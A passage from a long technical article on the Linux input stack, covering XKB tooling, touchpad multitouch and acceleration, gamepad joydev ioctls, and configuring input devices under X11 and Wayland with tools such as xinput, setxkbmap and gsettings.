    &lt;p&gt;After editing any of the files, the syntax can be validated with &lt;code&gt;xkbcli
compile-compose&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The way the file is used is that clients will pass it to the XKB compose parser to get an in-memory table of it. Then the client keeps the compose state, just like the modifier state, and plug it in the main interaction with XKB weâve seen earlier. Like this:&lt;/p&gt;
    &lt;p&gt;So, to make key composing work, itâs all dependent on the client, be it in X11 or Wayland. In general widget/toolkit libraries, and Xlib, does it out-of-the-box and/or easily for us.&lt;/p&gt;
    &lt;p&gt;Finally, letâs review how to interface with XKB from the command line.&lt;/p&gt;
    &lt;p&gt;There are a couple of X11 bound, and deprecated legacy, commands such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;xmodmap&lt;/code&gt;(pre-XKB even)&lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;setxkbmap&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcomp&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xev&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbprint&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbevd&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;They will not work on Wayland since they rely on the XKB X11 specific proto (XKM binary format and others), but are still good to debug certain behavior on X11, and to directly interface with X11 to configure XKB interpretation on the fly, since obviously itâs these software that rely on the library and load the appropriate configurations.&lt;/p&gt;
    &lt;p&gt;The main interaction these days should all pass through &lt;code&gt;xkbcli&lt;/code&gt; and
its subcommands. It comes with a few handy man pages:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-list&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-dump-keymap-x11&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-dump-keymap-wayland&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-interactive-x11&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-interactive-wayland&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-compile-compose&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-how-to-type&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-compile-keymap&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xkbcli-interactive-evdev&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;&amp;gt; xkbcli how-to-type 'P'
keysym: P (0x0050)
KEYCODE  KEY NAME  LAYOUT   LAYOUT NAME          LEVEL#  MODIFIERS
33       AD10      1        English (US)         2       [ Shift ]
33       AD10      1        English (US)         2       [ Lock ]
&lt;/code&gt;
    &lt;p&gt;To list the whole RMLVO possible values from the registry:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xkbcli list
&lt;/code&gt;
    &lt;p&gt;Print current RMLVO:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xkbcli compile-keymap --rmlvo
rules: "evdev"
model: "pc105"
layout: "us"
variant: ""
options: ""
&lt;/code&gt;
    &lt;p&gt;A nice debugging trace for a compose example &lt;code&gt;alt+'+e&lt;/code&gt; that outputs âÃ©â.&lt;/p&gt;
    &lt;p&gt;Letâs note I have these confs:&lt;/p&gt;
    &lt;p&gt;There are additional third party projects such as &lt;code&gt;klfcAUR&lt;/code&gt; to compile
layouts from JSON.&lt;/p&gt;
    &lt;p&gt;Probably the most impressive is how you can rely on the geometry and print it as a PDF, this only works with the legacy tools though:&lt;/p&gt;
    &lt;code&gt;&amp;gt; setxkbmap -print | xkbcomp -xkm - - | xkbprint - - | ps2pdf - mymap.pdf
&lt;/code&gt;
    &lt;p&gt;Another thing that is interesting to know is that the XKB keymap can be converted to Console keymap with scripts such as the &lt;code&gt;setupcon(1)&lt;/code&gt;
which relies on &lt;code&gt;ckbcomp&lt;/code&gt; and others, and will read confs from &lt;code&gt;/etc/default/keyboard&lt;/code&gt;.&lt;lb/&gt; Obviously, letâs not forget to mention &lt;code&gt;localectl(1)&lt;/code&gt; to interface with
&lt;code&gt;systemd-localed.service(8)&lt;/code&gt; that is the newer version of
&lt;code&gt;setupcon(1)&lt;/code&gt;. Itâs sort of a big wrapper over other tools and behavior
to automate things.&lt;/p&gt;
    &lt;code&gt;&amp;gt; localectl
System Locale: LANG=en_US.UTF-8
    VC Keymap: us
   X11 Layout: us
&lt;/code&gt;
    &lt;p&gt;Weâll see how it sets it in X11, but letâs just say it can be used to list keymaps:&lt;/p&gt;
    &lt;code&gt;&amp;gt; localectl list-keymaps
&lt;/code&gt;
    &lt;p&gt;There are also the options &lt;code&gt;list-x11-keymap-models&lt;/code&gt;,
&lt;code&gt;list-x11-keymap-layouts&lt;/code&gt;, &lt;code&gt;list-x11-keymap-variants [LAYOUT]&lt;/code&gt;,
&lt;code&gt;list-x11-keymap-options&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;And to set it with &lt;code&gt;set-x11-keymap&lt;/code&gt;. However it always tries to convert
the XKB keymap to console keymap whenever it can, if you donât want that
behavior, you should add this option:&lt;/p&gt;
    &lt;code&gt;&amp;gt; localectl set-x11-keymap --no-convert keymap
&lt;/code&gt;
    &lt;p&gt;Letâs end on a funny note to wrap things up about XKB. Yubikeys work by simulating keyboards, and thus they have to anticipate a very specific layout and variant, otherwise inserting a Yubikey would output the wrong values. To skip this, there are udev device properties (&lt;code&gt;ENV{}&lt;/code&gt;
set from hwdb) called &lt;code&gt;XKB_FIXED_LAYOUT&lt;/code&gt; and &lt;code&gt;XKB_FIXED_VARIANT&lt;/code&gt; that
need to be set and respected by the clients of libxkbcommon.&lt;/p&gt;
    &lt;p&gt;From &lt;code&gt;60-keyboard.hwdb&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# Yubico Yubico Yubikey II
evdev:input:b0003v1050p0010*
# Yubico Yubikey NEO OTP+CCID
evdev:input:b0003v1050p0111*
# Yubico Yubikey NEO OTP+U2F+CCID
evdev:input:b0003v1050p0116*
# OKE Electron Company USB barcode reader
evdev:input:b0003v05FEp1010*
 XKB_FIXED_LAYOUT=us
 XKB_FIXED_VARIANT=
&lt;/code&gt;
    &lt;p&gt;Hereâs a summary of what was discussed in the XKB stack:&lt;/p&gt;
    &lt;head rend="h1"&gt;Pointer Specifics&lt;/head&gt;
    &lt;p&gt;Weâve seen a lot of complex keyboard specific input behavior, letâs dabble a bit with pointer devices now, from mice to touchpads.&lt;/p&gt;
    &lt;head rend="h2"&gt;Types of Touchpads&lt;/head&gt;
    &lt;p&gt;Letâs mention a few definitions.&lt;lb/&gt; In general we call a pointer the representation of the input device, and the cursor the drawn icon representation.&lt;/p&gt;
    &lt;p&gt;We have clickpads, a touchpad that has no separate buttons, but that is all clickable. The behavior then depends on where the click happens. Meanwhile, forcepads are like clickpads but they donât have any buttons and instead will vibrate when pressed. Lastly, trackpoints are the little balls/nudge in the middle of the keyboard of Thinkpads, theyâre tagged in udev/hwdb with &lt;code&gt;ID_INPUT_POINTINGSTICK&lt;/code&gt; property.&lt;/p&gt;
    &lt;p&gt;As you can see from the above, the trackpoint also has attached to it some physical buttons, theyâre the ones above the Thinkpad touchpad. Itâs in between a mouse and a touchpad.&lt;/p&gt;
    &lt;p&gt;There are internal touchpads and external touchpads. The external touchpads donât get turned off when the lid is closed, nor disabled while typing. A graphic tablet such as a wacom device is effectively an external touchpad.&lt;lb/&gt; This information can be embedded in a udev device property called &lt;code&gt;ENV{ID_INPUT_TOUCHPAD_INTEGRATION}&lt;/code&gt;, and set to either âexternalâ or
âinternalâ. This is part of the hwdb, out-of-the-box:&lt;/p&gt;
    &lt;p&gt;Last interesting fact is that some touchpad can have capacitive touch, that means they can detect the finger in a range above the touchpad, hovering in proximity. This is the &lt;code&gt;BTN_TOOL_FINGER&lt;/code&gt; in contrast to
&lt;code&gt;BTN_TOUCH&lt;/code&gt;, but they often come together and so you have to discern if
itâs a real touchdown or not. For MT thereâs also &lt;code&gt;ABS_MT_PRESSURE&lt;/code&gt; and
&lt;code&gt;ABS_MT_DISTANCE&lt;/code&gt; that can be used for this. Thatâs another job that
libinput is good at.&lt;/p&gt;
    &lt;head rend="h2"&gt;MT â MultiTouch&lt;/head&gt;
    &lt;p&gt;We quickly went over the concept of MT, or multitouch before, letâs add a bit more info to that.&lt;/p&gt;
    &lt;p&gt;Multitouch are touchpads that support tracking more than one finger. They speak evdev multitouch to user-space (type B), and most often are handled by the hid-multitouch driver from the kernel side.&lt;/p&gt;
    &lt;p&gt;The capabilities of an MT touchpad should have something similar to this (&lt;code&gt;libinput record&lt;/code&gt; output or others):&lt;/p&gt;
    &lt;code&gt;key: BTN_LEFT, BTN_TOOL_FINGER, BTN_TOOL_DOUBLETAP, BTN_TOUCH 
     (BTN_TOOL_DOUBLETAP up to BTN_TOOL_QUINTTAP)
abs: ABS_X, ABS_Y, ABS_MT_SLOT, ABS_MT_POSITION_X, ABS_MT_POSITION_Y,
     ABS_MT_TOOL_TYPE, ABS_MT_TRACKING_ID
&lt;/code&gt;
    &lt;p&gt;There can also be &lt;code&gt;ABS_MT_TOUCH_MAJOR&lt;/code&gt;, &lt;code&gt;ABS_MT_TOUCH_MINOR&lt;/code&gt;,
&lt;code&gt;ABS_MT_WIDTH_MINOR&lt;/code&gt;, and &lt;code&gt;ABS_MT_WIDTH_MAJOR&lt;/code&gt;, that are used to provide
the size of the contact area in surface or absolute units. Thereâs
also &lt;code&gt;ABS_MT_ORIENTATION&lt;/code&gt;, for the orientation of the touching ellipse
(finger).&lt;/p&gt;
    &lt;p&gt;For MT, the key events are simple, they tell us how many fingers are tapping.&lt;lb/&gt; Then, fingers are tracked in whatâs called âslotsâ along with a new unique tracking id each time a finger touchdown again, and like all evdev itâs a stateful protocol.&lt;/p&gt;
    &lt;p&gt;So for example, slot 0 gets assigned tracking id 1 when the first finger is down, then slot 1 gets assigned tracking id 2 when the second finger is down, then the first finger is lifted and put back down again, and slot 0 gets assigned tracking id 3.&lt;lb/&gt; That can sound complex to track, and again thatâs where libinput shines. Hereâs what it looks like in a simplified evdev trace:&lt;/p&gt;
    &lt;code&gt;ABS_MT_SLOT 0
ABS_MT_TRACKING_ID 45
ABS_MT_POSITION_X x[0]
ABS_MT_POSITION_Y y[0]
ABS_MT_SLOT 1
ABS_MT_TRACKING_ID 46
ABS_MT_POSITION_X x[1]
ABS_MT_POSITION_Y y[1]
SYN_REPORT
// slot 0 moves in x position
ABS_MT_SLOT 0
ABS_MT_POSITION_X x[0]
SYN_REPORT
// lifting slot 0
ABS_MT_TRACKING_ID -1
SYN_REPORT
// lifting slot 1
ABS_MT_SLOT 1
ABS_MT_TRACKING_ID -1
SYN_REPORT
&lt;/code&gt;
    &lt;head rend="h2"&gt;Synaptics&lt;/head&gt;
    &lt;p&gt;Once upon a time everyone was bragging about their synaptics touchpad confs, yet this is now deprecated in favor of libinput. What was that all about?&lt;/p&gt;
    &lt;p&gt;Synaptics, unrelated to synaptics inc, was a complex X11 driver with so many configurations. It was buggy and had lots of internal magic, especially its acceleration profiles, which had logic split between the X11 server and the driver.&lt;/p&gt;
    &lt;code&gt; $ synclient -l
 Parameter settings:
 LeftEdge                = 1310
 RightEdge               = 4826
 TopEdge                 = 2220
 BottomEdge              = 4636
 FingerLow               = 25
 FingerHigh              = 30
 MaxTapTime              = 180
 ...
&lt;/code&gt;
    &lt;p&gt;Synaptics was configured through the command line &lt;code&gt;synclient&lt;/code&gt;. They
talked through a special interfaced with a custom protocol (shared memory
segment). That is before X11 had any standard way to dynamically be
configured (with &lt;code&gt;xinput&lt;/code&gt;), and before evdev was a thing. This was hacky.&lt;/p&gt;
    &lt;p&gt;These days X11 and Wayland rely on libinput so this should be used instead.&lt;/p&gt;
    &lt;p&gt;The only feature missing from libinput, which is implemented in user-space by the widget libraries and DE, is non-linear acceleration and speed, kinetic scrolling. Thatâs mostly a non-issue.&lt;/p&gt;
    &lt;head rend="h2"&gt;Acceleration Profile&lt;/head&gt;
    &lt;p&gt;Simply said, pointer acceleration is the function that multiplies the movement deltas with a given factor:&lt;/p&gt;
    &lt;code&gt;accel(x,y) = (Fx, Fy)
&lt;/code&gt;
    &lt;p&gt;One of the main role of libinput is to make pointer movement as precise as possible on all devices. If the user intends and performs action, the feedback should be that itâs what they expected to do.&lt;/p&gt;
    &lt;p&gt;An acceleration profile defines a series of points of the form &lt;code&gt;(x, f(x))&lt;/code&gt;,
input to output speed, that are linearly interpolated (a curve is drawn
between them for deduction). For example, flat acceleration is 
&lt;code&gt;[(0.0, 0.0), (1.0, 1.0)]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The default acceleration, adaptive, is pretty smart, and differs per device type and resolution, it already has these configured for touchpads for example:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;super-slow: deceleration&lt;/item&gt;
      &lt;item&gt;slow: deceleration&lt;/item&gt;
      &lt;item&gt;medium: adaptive+deceleration&lt;/item&gt;
      &lt;item&gt;fast: adaptive+fast&lt;/item&gt;
      &lt;item&gt;flick: fast&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In general, libinput allows to configure this behavior. We can pick between 3 pointer acceleration profiles: adaptive (default), flat the 45Â° one weâve seen, and custom profiles. Along with different types of motions the profiles can apply to: motion, scroll, fallback. We can configure points and steps for each one: the points are the x and y creating the curve of the acceleration profile we talked about, and the steps is how the interpolation granularity happens between the points (a value of 0 will use the default).&lt;lb/&gt; In most cases, not touching the acceleration profile provides better results.&lt;/p&gt;
    &lt;p&gt;In &lt;code&gt;libinput list-devices&lt;/code&gt; for a touchpad:&lt;/p&gt;
    &lt;code&gt;Accel profiles:          flat *adaptive custom
&lt;/code&gt;
    &lt;head rend="h2"&gt;Gestures&lt;/head&gt;
    &lt;p&gt;Weâve seen that libinput offers two types of gestures out-of-the-box: swiping and pinching. For anything else, one has to rely on third party libraries. Here are a few:&lt;/p&gt;
    &lt;p&gt;YMMV while using them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Gaming, libwacom, and Others&lt;/head&gt;
    &lt;p&gt;Letâs close this section with a few random details that donât need much discussion.&lt;/p&gt;
    &lt;p&gt;High-end gaming mice are finicky and often normal basic drivers are not enough to configure their high precision, nor is libinput. Thatâs why the libratbag project exists.&lt;/p&gt;
    &lt;p&gt;The libwacom (not only wacom) and tools such as Tuhi are used to manage information needed by libinput to handle drawing tablets. These tablets come with a tool such as a pen/stylus, itâs specificities are handled too. For example, pressing certain button to reverse the behavior and start erasing. There are X11 tools such as &lt;code&gt;xsetwacom&lt;/code&gt; that also help.&lt;/p&gt;
    &lt;p&gt;An interesting software is &lt;code&gt;gpm(8)&lt;/code&gt; which is a mouse in
the console that relies on reading directly the mouse stream
character device and interfacing/translating them to &lt;code&gt;TIOCLINUX&lt;/code&gt;
&lt;code&gt;TIOCL_SELMOUSEREPORT&lt;/code&gt;, terminal ioctl, to draw it. The terminal
will then output specific mouse reporting escape codes (more info
here).&lt;/p&gt;
    &lt;p&gt;Finally, hereâs a few pointer specific debug tools:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;cleartouch&lt;/item&gt;
      &lt;item&gt;mtview&lt;/item&gt;
      &lt;item&gt;mtdiag-qt&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;libinput debug-gui&lt;/code&gt;and&lt;code&gt;libinput debug-tablet&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Gamepad Specifics&lt;/head&gt;
    &lt;p&gt;Gamepads arenât handled by libinput in user-space, nor do they rely on the evdev handler in the kernel. Instead they rely on the joydev handler.&lt;/p&gt;
    &lt;p&gt;The gamepads get associated to their specific drivers, which will consume all these events. The joydev handler then normalizes and sends them to user-space in a format called &lt;code&gt;js_event&lt;/code&gt; from
&lt;code&gt;include/uapi/linux/joystick.h&lt;/code&gt;.&lt;lb/&gt; The handler will listen to all devices that support &lt;code&gt;EV_KEY&lt;/code&gt;
&lt;code&gt;BTN_JOYSTICK&lt;/code&gt; or &lt;code&gt;BTN_GAMEPAD&lt;/code&gt; and similar events, and create a stream
device in devtmpfs for it &lt;code&gt;/dev/input/jsN&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The handler character device supports a bunch of standard ioctl calls to get/set info:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGVERSION&lt;/code&gt;: get driver version&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGAXES&lt;/code&gt;: get number of axes&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGBUTTONS&lt;/code&gt;: get number of buttons&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGNAME(len)&lt;/code&gt;: get identifier string&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCSCORR&lt;/code&gt;: set correction values&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGCORR&lt;/code&gt;: get correction values&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCSAXMAP&lt;/code&gt;: set axis mapping&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGAXMAP&lt;/code&gt;: get axis mapping&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCSBTNMAP&lt;/code&gt;: set button mapping&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;JSIOCGBTNMAP&lt;/code&gt;: get button mapping&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Obviously, itâs better to do this via tools such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;jstest&lt;/code&gt;and&lt;code&gt;jstest-gtk&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;jscal&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;joyful&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Upper Stack: X11 &amp;amp; Wayland&lt;/head&gt;
    &lt;p&gt;Weâve reached the graphical environment with desktop widget libraries such as GNOME and Qt, and the XServer and Wayland Compositors. Theyâre the ones that rely on all types of input events for concrete behavior, from clicking buttons on the appropriate window, drawing a cursor on screen, scrolling, and literally all interactions a user has with a computer.&lt;lb/&gt; This upper stack relies on libinput and XKB to make everything happen. As far as these two are concerned, the role of the upper stack is to initialize them with the right configurations, and then create the handling for whatever theyâre meant to do.&lt;/p&gt;
    &lt;p&gt;The big difference between the X11 stack and Wayland stack is related to the protocol and where these libraries are included. There are no window managers in Wayland, but compositors that fully implement the standard protocol of both a display server and window manager at the same time. So itâs not a two-process equation, the compositor is the one handling libinput and implementing the desktop interface. Meanwhile, in X11, the Xserver, which is quite old, has the abstract concept of input drivers, of which the currently only useful one is &lt;code&gt;xf86-input-libinput&lt;/code&gt;. The
X11 input are interfaced with through the X11 protocol with XInput
events shared to the WM and other clients so that they can use them,
and configure the serverâs input devices. Similarly, in X11 all the
configurations happen over the X protocol and its extensions, meanwhile
for compositors thereâs no agreed way to configure things, so each
compositor can implement their own thing.&lt;lb/&gt; Hereâs a general picture of the stack (courtesy of who-t, Peter Hutterer):&lt;/p&gt;
    &lt;p&gt;Obviously, each have their own internal representation and ways of managing the information they get from libinput, XKB, and others, but this is outside the scope of this article (&lt;code&gt;wl_pointer&lt;/code&gt; and &lt;code&gt;wl_keyboard&lt;/code&gt; on
Wayland for example). Letâs focus more on how they configure the input
stack weâve seen.&lt;/p&gt;
    &lt;p&gt;The X server has an internal store of information about input devices, and their drivers, and will apply the default settings for each. To apply specific configurations for certain devices, we can add snippets in the X11 config directory, usually &lt;code&gt;/usr/share/X11/xorg.conf.d/&lt;/code&gt;.
The &lt;code&gt;libinput(4)&lt;/code&gt; driver settings can be passed there for a matching
device.&lt;/p&gt;
    &lt;p&gt;The âIdentifierâ is just a human-readable string for logging, meanwhile the series of âMatchâ statements can be found in &lt;code&gt;xorg.conf(5)&lt;/code&gt;, thereâs
quite a few of them and they remind us of udev rules. The âOptionâ
part is what interests us, these are the settings to pass to libinput
and that can be found in &lt;code&gt;libinput(4)&lt;/code&gt;. For example:&lt;/p&gt;
    &lt;p&gt;These should all be very familiar by now.&lt;/p&gt;
    &lt;p&gt;On the X11 stack, the server will initially set these values to override the default ones, but afterward, during runtime, any caller can rely on the X protocol to update them. The &lt;code&gt;xinput(1)&lt;/code&gt; command can be used to
debug and test setting X input devices.&lt;/p&gt;
    &lt;p&gt;To list input devices that the X server is aware of:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xinput list
â¡ Virtual core pointer                          id=2    [master pointer  (3)]
â   â³ Virtual core XTEST pointer                id=4    [slave  pointer  (2)]
â   â³ ETPS/2 Elantech Touchpad                  id=15   [slave  pointer  (2)]
â   â³ SEMICO USB Keyboard Consumer Control      id=10   [slave  pointer  (2)]
â£ Virtual core keyboard                         id=3    [master keyboard (2)]
    â³ Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]
    â³ Power Button                              id=6    [slave  keyboard (3)]
    â³ Video Bus                                 id=7    [slave  keyboard (3)]
    â³ Power Button                              id=8    [slave  keyboard (3)]
    â³ Sleep Button                              id=9    [slave  keyboard (3)]
    â³ AT Translated Set 2 keyboard              id=14   [slave  keyboard (3)]
    â³ Acer WMI hotkeys                          id=16   [slave  keyboard (3)]
    â³ GeneralPlus USB Audio Device              id=17   [slave  keyboard (3)]
    â³ SEMICO USB Keyboard Consumer Control      id=11   [slave  keyboard (3)]
    â³ SEMICO USB Keyboard System Control        id=12   [slave  keyboard (3)]
    â³ SEMICO USB Keyboard                       id=13   [slave  keyboard (3)]
&lt;/code&gt;
    &lt;p&gt;NB: Keep in mind the XTEST virtual devices, which only exist within X11 internally and donât appear in &lt;code&gt;libinput list-devices&lt;/code&gt;, weâll get
back to these in the next section.&lt;/p&gt;
    &lt;p&gt;Or list the properties of a particular device entry:&lt;/p&gt;
    &lt;p&gt;Or setting particular properties:&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;p&gt;What happens here is that the client (&lt;code&gt;xinput&lt;/code&gt;) talks to the X server
over the X protocol, then the X server talks to its libinput driver
&lt;code&gt;xf86-input-libinput&lt;/code&gt; which in turn talks to libinput and updates its
configurations, and the X server keeps track of all this.&lt;/p&gt;
    &lt;p&gt;These all look somewhat redundant, as you can see, itâs like having an intermediate layer. Thatâs why on Wayland thereâs no intermediary, if a client tells it, through whatever configuration means it exposes, to set certain settings on an input device, it does it directly via libinput.&lt;lb/&gt; Yet, the list of input devices is internal to Wayland, and not exposed directly in the protocol, thatâs why it differs in each compositor implementation.&lt;/p&gt;
    &lt;p&gt;For instance, if weâre toggling a setting in GNOME, KDE, MATE, or others, the behavior will be more direct. In GNOME, things happen through &lt;code&gt;gsettings&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;&amp;gt; gsettings list-keys  org.gnome.desktop.peripherals.
org.gnome.desktop.peripherals.keyboard
org.gnome.desktop.peripherals.mouse
org.gnome.desktop.peripherals.trackball
org.gnome.desktop.peripherals.pointingstick
org.gnome.desktop.peripherals.touchpad
â¦
&amp;gt; gsettings list-keys  org.gnome.desktop.peripherals.mouse
accel-profile
double-click
drag-threshold
left-handed
middle-click-emulation
natural-scroll
speed
&amp;gt; gsettings get org.gnome.desktop.peripherals.mouse accel-profile
'default'
&lt;/code&gt;
    &lt;p&gt;So thatâs how youâd configure input devices on GNOME Wayland compositor Mutter. Yet thatâs annoying, isnât there a common way to do this on Wayland?&lt;lb/&gt; There are workarounds such as libinput-config but itâs not very well maintained.&lt;/p&gt;
    &lt;p&gt;So, clients in graphical environments need to get input events to them. On X11 these are called X events, and they can be spied on with the &lt;code&gt;xev(1)&lt;/code&gt; tool, which can help debug issues. It shows events sent to the
particular window chosen.&lt;lb/&gt; In theory on X11 one could catch all events on the âroot windowâ is subscribed to (&lt;code&gt;xev -root&lt;/code&gt; does that) or of any other window. Events
conceptually travel down the window hierarchy, and clients only
receive the events for which they have selected an appropriate event
mask. However, the root window always sits at the top of this hierarchy
and can optionally subscribe to essentially all events before they
propagate to child windows, while grabs and higher-priority selections
(such as by the window manager) can intercept or redirect them. Thatâs
how WMs work, theyâre the parent window and have an âevent maskâ to
catch certain events and input for itself, and is exclusively allowed
to do redirect of certain events such as mapping/moving/configuring
windows.&lt;lb/&gt; Meanwhile, a sort of equivalent, but more simple, tool on Wayland is called wev, weâll do the comparison in a bit to help us understand the differences. Hereâs a trace of &lt;code&gt;xev&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;As you can observe here, The Xlib client does a lookup for keycode to keysym translation by relying on functions such as &lt;code&gt;XLookupString&lt;/code&gt; and
&lt;code&gt;XmbLookupString&lt;/code&gt;. These particular functions use a keymap logic that
dates back to pre-XKB time, weâll talk more about them in a bit. Yet,
internally now, the X server does rely on XKB in the backend, just like
for input device info, it keeps a keymap table internally, and itâs
shared over the X protocol with clients (they ask for it at connection,
or lazily when calling functions, and cache it) so that they perform
the translation with Xlib or XCB.&lt;lb/&gt; There are two main formats for the shared X server keymap the clients can rely on: the old âX core keymapâ, and an XKB keymap. Weâll discuss that old core keymap in a bit.&lt;lb/&gt; In XCB, the old keymap translation is done via:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;xcb_key_symbols_get_keycode&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;xcb_key_symbols_get_keysym&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And in Xlib with functions such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;XLookupString&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;Xutf8LookupString&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;XLookupKeysym&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;XkbTranslateKeyCode&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;XkbTranslateKeySym&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;XStringToKeysym&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;XKeysymToKeycode&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Meanwhile, with the newer XKB keymap itâs done via:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;XkbTranslateKeyCode&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Or in XCB with the &lt;code&gt;xcb_xkb_*&lt;/code&gt; functions (you have to do it manually).&lt;/p&gt;
    &lt;p&gt;In all cases, since XKB is the tech in the backend of the X server that stores the keymap truth, itâs what needs to be configured. The XKB configuration can be set statically, along with the usual input confs weâve seen earlier, with the Xkb options:&lt;/p&gt;
    &lt;p&gt;There are also two special options that get interpreted when certain special keysym are generated, the &lt;code&gt;DontVTSwitch&lt;/code&gt; which is there to disable
the &lt;code&gt;ctrl+alt+fn&lt;/code&gt; sequence to switch virtual terminal, and the &lt;code&gt;DontZap&lt;/code&gt;
which catches the &lt;code&gt;Terminate_Server&lt;/code&gt; keysym of XKB and will kill the Xorg
server. Both are enabled by default and these options would turn them off.&lt;/p&gt;
    &lt;p&gt;To change the XKB options on a running X server on-the-fly, we need to rely on two tools: &lt;code&gt;xkbcomp(1)&lt;/code&gt; and &lt;code&gt;setxkbmap(1)&lt;/code&gt;. The first one is
used to compile new KcCGST and upload it to the server as a full keymap
in XKM compiled format that the server understands, and the second one
to change the current value of the RMLVO.&lt;/p&gt;
    &lt;code&gt;$ setxkbmap -model thinkpad60 -layout us,sk,de -variant altgr-intl,qwerty \
       -option -option grp:menu_toggle -option grp_led:caps -print
&lt;/code&gt;
    &lt;p&gt;We can get the same info as with &lt;code&gt;xkbcli&lt;/code&gt; too:&lt;/p&gt;
    &lt;p&gt;Now letâs talk about that pre-XKB logic with functions such as &lt;code&gt;XLookupKeysym(3)&lt;/code&gt; weâve seen in the &lt;code&gt;xev&lt;/code&gt; trace earlier. Itâs currently
basically a wrapper over XKB, but that can also bypass it entirely. It
relies on the old âX core keymap tableâ in the X server, a facade on
the authoritative keymap that is XKB backed. The client asks for it
via a request, cache it, and use it for the mapping of X11 keycode
to X11 keysym. Itâs own X11 keycodes are implementation dependent,
but nowadays itâs mostly &lt;code&gt;evdev + 8&lt;/code&gt;, and its keysyms are found in
&lt;code&gt;/usr/include/X11/keysymdef.h&lt;/code&gt;, which the newer XKB stack also relies
on in X11. So that old keymap is indeed initially filled with the XKB
keymap. The tool &lt;code&gt;xmodmap(1)&lt;/code&gt; will help us explore and show some of the
things it handles.&lt;/p&gt;
    &lt;p&gt;To print its internal keymap table:&lt;/p&gt;
    &lt;code&gt;&amp;gt; xmodmap -pk
There are 7 KeySyms per KeyCode; KeyCodes range from 8 to 255.

    KeyCode Keysym (Keysym)   ...
    Value   Value   (Name)    ...

      8
      9     0xff1b (Escape)   0x0000 (NoSymbol) 0xff1b (Escape)
